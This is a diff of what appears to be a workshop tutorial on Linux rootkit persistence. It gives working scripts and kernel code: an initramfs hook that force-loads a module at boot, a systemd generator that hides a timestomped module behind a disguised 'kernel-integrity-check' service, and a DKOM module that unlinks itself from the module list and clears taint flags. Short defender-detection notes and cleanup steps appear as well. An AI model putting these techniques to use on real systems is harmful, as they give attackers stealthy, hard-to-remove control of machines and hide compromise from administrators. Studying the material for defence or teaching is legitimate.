@@ -1,4 +1,6 @@
-  ____  _____ ____  ____ ___ ____ _____ _____ _   _  ____ _____ 
+```txt
+
+____  _____ ____  ____ ___ ____ _____ _____ _   _  ____ _____ 
  |  _ \| ____|  _ \/ ___|_ _/ ___|_   _| ____| \ | |/ ___| ____|
  | |_) |  _| | |_) \___ \| |\___ \ | | |  _| |  \| | |   |  _| 
  |  __/| |___|  _ < ___) | | ___) || | | |___| |\  | |___| |___ 
@@ -11,24 +13,17 @@
 
 ----[ Introduction - The Immortal Rootkit ]-----------------------------------
 
-You have built Userland hooks, Ftrace interceptors, Kprobes snipers, and eBPF 
-spies. You are essentially God on the system.
+You have built Userland hooks, Ftrace interceptors, and Kprobes snipers. You 
+are essentially God on the system.
 
 Until the administrator types: reboot
 
 If your rootkit does not survive a restart, it is not a rootkit; it is a 
-party trick. Persistence is the art of automatically reloading your code 
-early in the boot process.
+party trick. Persistence is the art of hacking auto-reload.
 
-Most tutorials teach you to use /etc/modules-load.d/ or standard systemd 
-services. These are "noisy" and easily detected by basic auditing tools.
-
-We will focus on techniques that leave minimal forensic footprints:
-1.  Initramfs Infection (Loading before the OS mounts).
-2.  Systemd Generator Poisoning (Fileless service injection).
-3.  Module Hijacking (Dependency Injection).
-4.  DKOM (Direct Kernel Object Manipulation) to hide the evidence.
-
+1. Initramfs Infection (Loading before the OS mounts)
+2. Systemd Generator Poisoning (Fileless service injection)
+3. DKOM (Direct Kernel Object Manipulation) to hide the evidence
 
 ----[ The Boot Chain Attack Surface ]-----------------------------------------
 
@@ -58,23 +53,23 @@ We will focus on techniques that leave minimal forensic footprints:
          [ LOGIN PROMPT ]
 
 
-----[ The "Loud" Payload ]-------------------------------------------------
+----[ The "Loud" Payload ]----------------------------------------------------
 
-To verify persistence, we first need a payload that screams "I AM HERE" when 
-it loads. We use `KERN_ALERT` to ensure the message hits the logs immediately.
+To verify persistence, we need a payload that screams "I AM HERE" when it loads. 
+We use `KERN_ALERT` to ensure the message hits the logs immediately.
 
-chaos.c
+1. Create these files in your `persistence/` directory.
 
+----[ chaos.c ]---
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Demo");
+MODULE_AUTHOR("0xtengu");
 MODULE_DESCRIPTION("Persistence Test Payload");
 
 static int __init chaos_init(void) {
-    // KERN_ALERT ensures it prints to the console even if logging level is low
     printk(KERN_ALERT "========================================\n");
     printk(KERN_ALERT "[+] PERSISTENCE SUCCESSFUL: Chaos Loaded\n");
     printk(KERN_ALERT "========================================\n");
@@ -87,26 +82,32 @@ static void __exit chaos_exit(void) {
 
 module_init(chaos_init);
 module_exit(chaos_exit);
+------------------
 
-# Makefile
-
+----[ Makefile ]---
 obj-m += chaos.o
 all:
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 clean:
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+-------------------
 
-----[ Technique 1: The Injection Vector - Native Hooks ]---------------------------------
+2. Compile the payload. We will use `chaos.ko` in the next steps.
 
-WARNING: Do not manually unpack the initramfs using cpio. It is brittle and can brick the 
-bootloader if directory nesting is handled incorrectly.
+----[ terminal ]---
+make
+# Ensure 'chaos.ko' is generated
+-------------------
 
-The professional method is to use initramfs-tools hooks. These scripts run automatically 
-whenever the system rebuilds the boot image (e.g., during a kernel update). This ensures your 
-rootkit re-infects the system after an upgrade.
 
-File: /etc/initramfs-tools/hooks/persistence
+----[ Technique 1: Initramfs Infection ]--------------------------------------
 
+The `initramfs` is a small archive loaded into RAM before the real root 
+filesystem. By injecting here, our rootkit loads before most security tools.
+
+We will create a hook script locally, then install it to the system.
+
+----[ infect_initramfs.sh ]---
 #!/bin/sh
 PREREQ=""
 prereqs() {
@@ -121,40 +122,76 @@ esac
 
 . /usr/share/initramfs-tools/hook-functions
 
-# ---[ EXTENSION: ANTI-FORENSICS (Timestomping) ]---
-mimic_time() {
-    # Finds a legitimate file in the same directory and borrows its timestamp
-    target="$1"
-    dir=$(dirname "$target")
-    
-    # Find the first file in that dir that isn't our rootkit
-    ref=$(find "$dir" -maxdepth 1 -type f ! -name "$(basename "$target")" | head -n 1)
-    
-    if [ -n "$ref" ]; then
-        touch -r "$ref" "$target"
-        echo " [!] Timestomped: $(basename "$target") now matches $(basename "$ref")" >&2
-    fi
-}
+# 1. Define where our rootkit is currently sitting (Change this path!)
+# This should point to your compiled chaos.ko on the desktop
+SOURCE_MODULE="/home/tengu/Desktop/cactuscon/rootkit/p2/chaos.ko"
+
+# 2. Define where we want it inside the image
+TARGET_DIR="/lib/modules/$(uname -r)/kernel/drivers/hid"
+
+# 3. Create the directory inside the initramfs workspace
+mkdir -p $DESTDIR/$TARGET_DIR
+
+# 4. Copy the module in using the helper function
+cp $SOURCE_MODULE $DESTDIR/$TARGET_DIR/chaos.ko
+
+# 5. Force it to load at boot
+force_load chaos
+
+
 
 # ---[ Deployment
-1. install the hook:
 
-    sudo cp hooks/persistence /etc/initramfs-tools/hooks/persistence
-    sudo chmod +x /etc/initramfs-tools/hooks/persistence
+1. Install the hook from your local directory to the system directory.
+   
+----[ terminal ]---
+# Make it executable locally
+chmod +x initramfs_hook.sh
 
-2. trigger infection: This command rebuilds the boot image. The hook
-script will run in the background, copying the rootkit and timestomping it (if extension used)
+# Copy it to the system hooks directory (Note: Target filename usually lacks extension in /etc)
+sudo cp initramfs_hook.sh /etc/initramfs-tools/hooks/persistence
 
-    sudo update-initramfs -u
+2. Trigger the infection (Rebuilds boot image).
+   
+----[ terminal ]---
+sudo update-initramfs -u
+-------------------
 
-3. Reboot and verify: sudo reboot
+3. Reboot and Verify.
+   
+----[ terminal ]---
+# verfiy module is in new image
+lsinitramfs /boot/initrd.img-$(uname -r) | grep chaos
+
+sudo reboot
+
+# ... Wait for reboot ...
 
 4. Once logged back in:
 
-    sudo dmesg | grep "PERSISTENCE"
+# Check logs for our loud payload
+sudo dmesg | grep "PERSISTENCE"
         # Output: [+] PERSISTENCE SUCCESSFUL: Chaos Loaded
 
+5. Remove
+sudo rm /etc/initramfs-tools/hooks/persistence
+sudo update-initramfs -u
+
+#should be empty, but we have not been aggressive enough
+lsinitramfs /boot/initrd.img-$(uname -r) | grep chaos
+
+find /lib/modules/$(uname -r) -name "chaos.ko"
+/lib/modules/6.17.10+kali-amd64/kernel/drivers/hid/chaos.ko
+
+sudo rm /lib/modules/6.17.10+kali-amd64/kernel/drivers/hid/chaos.ko
+# lol still fails
+# you have to nuke the infected image and build a clean one
+sudo update-initramfs -d -k $(uname -r)
+sudo update-initramfs -c -k $(uname -r)
+
+###############################################
 ### How do defenders catch this technique? ###
+#############################################
 
 The "X-Ray" Scan (lsinitramfs): Standard Antivirus scans the disk, not 
 the compressed boot image. Defenders must list the archive contents manually.
@@ -163,7 +200,7 @@ the compressed boot image. Defenders must list the archive contents manually.
 
 no timestomping = obvious
 
-### good demo to show when breaking it ###
+### WANT TO SEE HOW TO BREAK IT? ###
 # Delete binary caches to force the kernel to read our text file and recover 
 rm "lib/modules/$KERNEL_VER/modules.dep.bin" 2>/dev/null
 rm "lib/modules/$KERNEL_VER/modules.alias.bin" 2>/dev/null
@@ -196,11 +233,10 @@ rm "lib/modules/$KERNEL_VER/modules.builtin.bin" 2>/dev/null
             # Boot
             boot
 
-
 ----[ Technique 2: Systemd Generator Poisoning ]------------------------------
 
-Admins audit `/etc/systemd/system/` for malicious service files. They almost 
-never look in `/lib/systemd/system-generators/`.
+Systemd Generators run very early and create unit files in RAM (`/run/`).
+Files in `/run/` disappear on reboot, leaving no trace on the disk.
 
 # the mechanism
 Executables in this directory are run by Systemd *very* early in the boot 
@@ -209,10 +245,9 @@ Because `/run/` is a temporary filesystem (tmpfs) stored in RAM:
 1.  The malicious service file is created in RAM at boot.
 2.  Systemd executes it, loading the rootkit.
 3.  The service file vanishes when the system powers down.
-4.  There is **zero trace** of the service file on the hard disk.
 
-poison_systemd.sh
 
+----[ poison_systemd.sh ]---
 #!/bin/bash
 # poison_systemd.sh
 # Usage: ./poison_systemd.sh <path_to_module.ko>
@@ -229,7 +264,6 @@ fi
 # 1. Hide the module on disk
 mkdir -p "$HIDDEN_PATH"
 cp "$MODULE_SRC" "$HIDDEN_PATH/driver.ko"
-# Anti-Forensics: Timestomp to match a system binary (ls)
 touch -r /bin/ls "$HIDDEN_PATH/driver.ko"
 
 # 2. Create the Generator Script
@@ -243,7 +277,6 @@ OUT_DIR="\$1"
 SERVICE="kernel-integrity-check.service"
 
 # Create the service file in memory (RAM)
-# Note: DefaultDependencies=no is CRITICAL to avoid ordering cycles
 cat <<UNIT > "\$OUT_DIR/\$SERVICE"
 [Unit]
 Description=Kernel Integrity Verification
@@ -260,7 +293,7 @@ RemainAfterExit=yes
 WantedBy=sysinit.target
 UNIT
 
-# Link it to be started automatically by the system initialization
+# Link it to be started automatically
 mkdir -p "\$OUT_DIR/sysinit.target.wants"
 ln -s "\$OUT_DIR/\$SERVICE" "\$OUT_DIR/sysinit.target.wants/\$SERVICE"
 exit 0
@@ -273,6 +306,9 @@ echo "[+] Generator planted at $GENERATOR_PATH"
 echo "[+] Module hidden at $HIDDEN_PATH/driver.ko"
 echo "[+] On next boot, service will generate into RAM and load module."
 
+-----------------------------------
+-------------------------------
+---------------------------
 ### verify and demo ###
 
     sudo ./poison_systemd.sh chaos.ko
@@ -310,21 +346,27 @@ ls -l /run/systemd/generator/kernel-integrity-check.service
 3. Refresh systemd
     sudo systemctl daemon-reload
 
-----[ Technique 4: DKOM -  Evasion Module ]-------------------------------
+        Still see the ghost?
+4. Don't forget to stop the service
+sudo systemctl stop kernel-integrity-check
 
-**Objective:** Total Invisibility.
-Once a rootkit is loaded, it leaves two major footprints:
-1.  **The List:** It appears in `lsmod` and `/proc/modules`.
-2.  **The Taint:** Loading unsigned code sets "Taint Flags" in the kernel, alerting admins that the system integrity is compromised (visible in `/proc/sys/kernel/tainted`).
+5. Reboot to wipe completely clean
+sudo reboot
 
-**The Solution: DKOM (Direct Kernel Object Manipulation)**
-Instead of hooking functions to "lie" about the presence of the module, we will modify the kernel's memory structures directly to **remove** the evidence.
+----[ Technique 3: DKOM - The "Vanish" Module ]-------------------------------
+
+Now we hide the traces. This module unlinks itself from `lsmod` and cleans the 
+kernel taint flags.
+
+**The Taint:** Loading unsigned code sets "Taint Flags" in the kernel, alerting admins that the system integrity is compromised (visible in `/proc/sys/kernel/tainted`).
+- The Solution:
+Instead of hooking functions to "lie" about the presence of the module, we will modify the kernel's memory structures directly to remove the evidence.
 
 ### 1. The Source Code (`vanish.c`)
 This code removes the module from the kernel's internal linked lists and scrubs the taint flags. 
 *Note: We do not hardcode the taint address; we expect it to be passed in by the build script.*
 
-
+----[ vanish.c ]---
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
@@ -332,7 +374,7 @@ This code removes the module from the kernel's internal linked lists and scrubs 
 #include <linux/kobject.h> // For kobject_del
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Tengu");
+MODULE_AUTHOR("0xtengu");
 MODULE_DESCRIPTION("DKOM Persistence & Evasion Demo");
 
 // The build script will find the address and pass it here.
@@ -394,10 +436,13 @@ static void __exit dkom_exit(void) {
 
 module_init(dkom_init);
 module_exit(dkom_exit);
+-------------------
 
+2. Create the Build Script.
+   We cannot use a standard Makefile because we need to dynamically find the 
+   taint address in `/proc/kallsyms` and pass it to the compiler.
 
-### build_vanish.sh ###
-
+----[ build_vanish.sh ]---
 #!/bin/bash
 
 # Check for root (needed to read /proc/kallsyms)
@@ -434,7 +479,7 @@ make -C /lib/modules/$(uname -r)/build M=$PWD KCPPFLAGS="-DTAINT_ADDR=$ADDR" mod
 
 echo "[+] Build complete."
 echo "    Run: sudo insmod vanish.ko"
-
+--------------------------
 
 ### makefile ###
 obj-m += vanish.o
@@ -445,6 +490,9 @@ all:
 clean:
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
 
+3. Build and Load.
+
+----[ terminal ]---
 #### verify and usage ####
 cat /proc/sys/kernel/tainted
 # Output Example: 12288
@@ -462,8 +510,16 @@ cat /proc/sys/kernel/tainted
 sudo dmesg | tail
     : shows "rootkit: ....."
 
+sudo rmmod vanish.ko...
+        wait...
+    `list_del_init(&THIS_MODULE->list)`
+    We removed the entry from that list
+    so the code is still in memory, running.
+    Door to unload it (rmmod) has been bricked over
+....only way to remove now is to **reboot.**
 
-  ____  _   _ __  __ __  __    _    ____  __   __
+
+ ____  _   _ __  __ __  __    _    ____  __   __
  / ___|| | | |  \/  |  \/  |  / \  |  _ \ \ \ / /
  \___ \| | | | |\/| | |\/| | / _ \ | |_) | \ V / 
   ___) | |_| | |  | | |  | |/ ___ \|  _ <   | |  
@@ -472,40 +528,24 @@ sudo dmesg | tail
 
 ----[ Workshop Summary & Final Checklist ]------------------------------------
 
-Congratulations. You have traversed the entire landscape of Linux Kernel 
-Rootkits. You have moved from simple userland tricks to advanced memory 
-manipulation.
+Congratulations. You have traversed the landscape of Linux Kernel Rootkits:
 
 1.  FOUNDATIONS
-    [✓] Understanding Kernel Space vs User Space.
-    [✓] Compiling and Loading Modules.
-
 2.  USERLAND
-    [✓] LD_PRELOAD hijacking.
-    [✓] GOT/PLT manipulation.
-
 3.  FTRACE
-    [✓] Hooking syscalls (sys_kill).
-    [✓] Bypassing kallsyms restrictions.
-
 4.  KPROBES
-    [✓] Hooking internal instructions.
-    [✓] Hijacking execution flow (RIP modification).
-    [✓] Creating zombie processes.
-
 5.  eBPF
-    [✓] Writing verifiable, safe hooks.
-    [✓] Using XDP for invisible network drops.
-    [✓] Writing custom loaders.
-
 6.  PERSISTENCE
-    [✓] Initramfs Infection (Scripted).
-    [✓] Systemd Generator Poisoning (Scripted).
-    [✓] Dependency Injection (Scripted).
-    [✓] DKOM (C Implementation).
 
+Well Done!
+Happy Hacking!
+
+And remember, always RTFM.
 
 [+] The Workshop is Complete
 [!] System Halted
 
 .EOF
+
+
+```
